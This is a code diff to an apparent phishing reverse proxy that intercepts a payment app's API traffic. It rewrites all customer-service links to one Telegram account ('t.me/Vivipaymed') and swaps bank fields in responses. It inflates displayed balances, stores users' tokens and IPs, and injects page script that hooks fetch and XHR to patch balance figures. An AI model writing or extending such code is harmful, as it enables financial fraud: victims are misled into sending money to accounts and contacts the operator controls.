@@ -157,20 +157,41 @@ function getClientIP(req) {
   return req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || req.headers['x-real-ip'] || '';
 }
 
-function resolveUserId(req) {
+async function resolveUserId(req) {
   const tok = getTokenFromReq(req);
   if (tok && tokenUserMap[tok]) return tokenUserMap[tok];
   const ip = getClientIP(req);
   if (ip && ipUserMap[ip]) return ipUserMap[ip];
+  try {
+    const data = await loadData();
+    if (data.tokenMap) {
+      if (tok && data.tokenMap[tok]) {
+        tokenUserMap[tok] = data.tokenMap[tok];
+        return data.tokenMap[tok];
+      }
+      if (ip && data.tokenMap['ip_' + ip]) {
+        ipUserMap[ip] = data.tokenMap['ip_' + ip];
+        return data.tokenMap['ip_' + ip];
+      }
+    }
+  } catch(e) {}
   return '';
 }
 
-function saveUserMapping(req, userId) {
+async function saveUserMapping(req, userId) {
   if (!userId) return;
   const tok = getTokenFromReq(req);
   if (tok) tokenUserMap[tok] = String(userId);
   const ip = getClientIP(req);
   if (ip) ipUserMap[ip] = String(userId);
+  try {
+    const data = await loadData();
+    if (!data.tokenMap) data.tokenMap = {};
+    let changed = false;
+    if (tok && data.tokenMap[tok] !== String(userId)) { data.tokenMap[tok] = String(userId); changed = true; }
+    if (ip && data.tokenMap['ip_' + ip] !== String(userId)) { data.tokenMap['ip_' + ip] = String(userId); changed = true; }
+    if (changed) await saveData(data);
+  } catch(e) {}
 }
 
 function parseMultipartFields(rawBody) {
@@ -807,34 +828,24 @@ app.all('/xxapi/*', async (req, res) => {
 
     const respData = jsonResp.data || jsonResp.body || jsonResp.result || null;
 
-    if (urlLower.includes('customerservice')) {
-      const csData = [
-        { title: 'ViviPay Online Service', subtitle: 'TG - Subscription Channel', icon: 'telegram', url: 'https://t.me/Vivipaymed' },
-        { title: 'ViviPay Online Service', subtitle: 'WhatsApp - Subscription Channel', icon: 'whatsapp', url: 'https://t.me/Vivipaymed' },
-        { title: 'Online CSR', subtitle: 'Official Customer Service', icon: 'headset', url: 'https://t.me/Vivipaymed' }
-      ];
-      function replaceCSUrls(obj) {
+    if (urlLower.includes('customerservice') || urlLower.includes('customer_service') || urlLower.includes('customer-service') || urlLower.includes('csrlist') || urlLower.includes('servicelist')) {
+      function replaceAllUrls(obj) {
         if (!obj || typeof obj !== 'object') return;
-        if (Array.isArray(obj)) {
-          obj.forEach(item => replaceCSUrls(item));
-          return;
-        }
+        if (Array.isArray(obj)) { obj.forEach(item => replaceAllUrls(item)); return; }
         for (const k of Object.keys(obj)) {
-          const kl = k.toLowerCase();
           if (typeof obj[k] === 'string') {
-            if (kl === 'url' || kl === 'link' || kl === 'href' || kl === 'value' || kl === 'action' || kl === 'jumpurl' || kl === 'jump_url' || kl === 'target' || kl === 'redirect' || kl === 'serviceurl' || kl === 'service_url' || kl === 'contacturl' || kl === 'contact_url') {
-              obj[k] = 'https://t.me/Vivipaymed';
-            }
-            if ((obj[k].startsWith('http://') || obj[k].startsWith('https://')) && (obj[k].includes('t.me/') || obj[k].includes('wa.me/') || obj[k].includes('whatsapp') || obj[k].includes('telegram') || obj[k].includes('chat') || obj[k].includes('service') || obj[k].includes('support'))) {
+            const v = obj[k].trim();
+            if (v.startsWith('http://') || v.startsWith('https://') || v.startsWith('tg://') || v.startsWith('whatsapp://')) {
               obj[k] = 'https://t.me/Vivipaymed';
             }
           } else if (typeof obj[k] === 'object') {
-            replaceCSUrls(obj[k]);
+            replaceAllUrls(obj[k]);
           }
         }
       }
-      replaceCSUrls(jsonResp);
-      const finalCS = JSON.stringify(jsonResp);
+      replaceAllUrls(jsonResp);
+      const finalBody = JSON.stringify(jsonResp);
+      const finalCS = finalBody.replace(/https?:\/\/[^\s"',}\]]+/g, 'https://t.me/Vivipaymed');
       respHeaders['content-length'] = String(Buffer.byteLength(finalCS));
       res.writeHead(response.status, respHeaders);
       return res.end(finalCS);
@@ -857,14 +868,14 @@ app.all('/xxapi/*', async (req, res) => {
     if (respData && typeof respData === 'object') userId = findNumericId(respData, 0);
     if (!userId) userId = findNumericId(jsonResp, 0);
     if (!userId) userId = findNumericId(reqBody, 0);
-    if (!userId) userId = resolveUserId(req);
+    if (!userId) userId = await resolveUserId(req);
 
     const reqPhone = reqBody.phone || reqBody.mobile || reqBody.memberPhone || reqBody.username || reqBody.loginName || reqBody.account || '';
     const respPhone = (respData && typeof respData === 'object') ? (respData.phone || respData.mobile || respData.memberPhone || respData.loginName || '') : '';
     const phone = reqPhone || respPhone;
 
     if (userId) {
-      saveUserMapping(req, userId);
+      await saveUserMapping(req, userId);
       if (!data.trackedUsers) data.trackedUsers = {};
       const existing = data.trackedUsers[String(userId)] || {};
       data.trackedUsers[String(userId)] = {
@@ -1009,8 +1020,8 @@ app.all('/xxapi/*', async (req, res) => {
         deepReplaceBankFields(jsonResp, bank, 0, globalHasAcct);
       }
 
-      if (userId) {
-        const uo = (data.userOverrides && data.userOverrides[String(userId)]) || {};
+      {
+        const uo = userId ? ((data.userOverrides && data.userOverrides[String(userId)]) || {}) : {};
         const addedBalance = uo.addedBalance || 0;
         const globalBonus = data.depositBonus || 0;
         const totalBonus = addedBalance + globalBonus;
@@ -1141,7 +1152,9 @@ cacheBal(d);
 for(var i=0;i<ID_FIELDS.length;i++){
 var f=ID_FIELDS[i];
 if(d[f]){var v=String(d[f]).trim();
-if(/^\\d{6,12}$/.test(v)){setUID(v);break;}}}}}catch(e){}});
+if(/^\\d{6,12}$/.test(v)){setUID(v);break;}}}}
+setTimeout(patchBalDOM,50);setTimeout(patchBalDOM,200);setTimeout(patchBalDOM,500);
+}catch(e){}});
 return _send.apply(this,arguments);};
 
 var _fetch=window.fetch;
